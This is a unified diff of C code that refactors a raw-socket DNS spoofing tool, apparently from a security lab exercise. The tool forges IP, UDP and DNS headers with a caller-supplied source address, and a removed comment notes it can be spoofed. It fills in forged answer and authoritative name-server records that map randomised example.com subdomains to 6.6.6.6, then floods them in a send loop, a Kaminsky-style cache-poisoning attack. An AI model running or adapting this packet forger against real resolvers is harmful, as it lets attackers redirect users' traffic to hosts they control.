@@ -273,19 +273,31 @@ unsigned int write_authorative_answer(void *buffer, char *name_server) {
     
 }
 
-void dns_a (
+//Returns amount of bytes of packet written to dst_buffer
+unsigned int dns_a (
     char *src_ip, 
     char *dst_ip, 
     char *query, 
     char *ip_answer, 
-    char *dst_buffer, 
-    unsigned int *dst_packetquery_len) 
+    char *dst_buffer) 
 {
 
     char *buffer = dst_buffer;
     // Our own headers' structures
     struct ipheader *ip = (struct ipheader *) buffer;
+    ip->iph_ident = htons(rand()); // we give a random number for the identification#
+    ip->iph_ttl = 110; // hops
+    ip->iph_protocol = 17; // UDP
+    ip->iph_sourceip = inet_addr(src_ip);
+    ip->iph_destip = inet_addr(dst_ip);
+    ip->iph_ihl = 5;
+    ip->iph_ver = 4;
+    ip->iph_tos = 0; // Low delay
+
     struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
+    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
+    udp->udph_destport = htons(53);
+
     struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
 
     // data is the pointer points to the first byte of the dns payload  
@@ -320,45 +332,15 @@ void dns_a (
     dns->NSCOUNT=htons(1); //Name Server count
     
 
-    printf("Question bytes: %d\n", bytes_written_question);
-    printf("Answer bytes: %d\n", bytes_written_answer);
-    printf("Authorative bytes: %d\n", bytes_written_authorative_answer);
-
     unsigned int bytes_written_sum =  bytes_written_question + bytes_written_answer + bytes_written_authorative_answer;
-
-    printf("Total DNS data bytes written: %d\n",bytes_written_sum);
-
-
-
-    // Fabricate the IP header or we can use the
-
-    // standard header structures but assign our own values.
-    ip->iph_ihl = 5;
-    ip->iph_ver = 4;
-    ip->iph_tos = 0; // Low delay
-
-    last_byte += 10;
     unsigned short int packetquery_len =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+ bytes_written_sum );
+    ip->iph_len=htons(packetquery_len);
     udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+bytes_written_sum);
 
-    //printf("Packet query_len = %d\n", packetquery_len);
-    ip->iph_len=htons(packetquery_len);
-    ip->iph_ident = htons(rand()); // we give a random number for the identification#
-    ip->iph_ttl = 110; // hops
-    ip->iph_protocol = 17; // UDP
-    // Source IP address, can use spoofed address here!!!
-    ip->iph_sourceip = inet_addr(src_ip);
-    // The destination IP address
-    ip->iph_destip = inet_addr(dst_ip);
-    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
-    // Destination port number
-    udp->udph_destport = htons(53);
     ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
     udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader));
 
-
-    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
-    *dst_packetquery_len = packetquery_len;
+    return packetquery_len;
 }
 
 int main(int argc, char *argv[])
@@ -399,7 +381,8 @@ int main(int argc, char *argv[])
     // set the buffer to 0 for all bytes
     memset(buffer, 0, PCKT_LEN);
 
-    unsigned int packetquery_len = 0;
+    //Packet length in bytes
+    unsigned int packet_len = 0;
 
     char query[18];
     strcpy(query, "\4abcd\7example\3com");
@@ -413,13 +396,11 @@ int main(int argc, char *argv[])
             query[i] = '1' + rand() % ('9'-'1');
         }
 
-        dns_a(src_ip, dst_ip, query, "6.6.6.6", buffer, &packetquery_len);
-        //dns_q(src_ip, dst_ip, query, buffer, &packetquery_len);
+        packet_len = dns_a(src_ip, dst_ip, query, "6.6.6.6", buffer);
 
         printf("Query: %s\n", query);
-        //printf("Packet query_len: %d\n", packetquery_len);
         
-        if(sendto(sd, buffer, packetquery_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+        if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
             printf("packet send error %d which means %s\n",errno,strerror(errno));
         }
     }
